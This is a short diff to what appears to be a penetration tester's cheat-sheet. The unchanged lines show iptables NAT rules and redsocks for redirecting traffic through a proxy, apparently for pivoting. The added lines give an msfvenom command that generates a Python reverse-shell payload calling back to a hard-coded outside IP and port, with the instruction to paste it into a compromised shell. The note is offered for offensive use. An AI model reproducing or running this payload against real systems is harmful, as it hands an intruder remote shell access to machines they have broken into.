@@ -40,3 +40,7 @@ dd
 `iptables -t nat -A OUTPUT -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
 `iptables -t nat -A PREROUTING -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
 `/usr/sbin/redsocks -c /etc/redsocks.conf `
+
+# Get a proper shell from a half/broken shell
+`msfvenom -p cmd/unix/reverse_python lhost=69.201.13.55 lport=3344 R`
+paste in your shell, profit
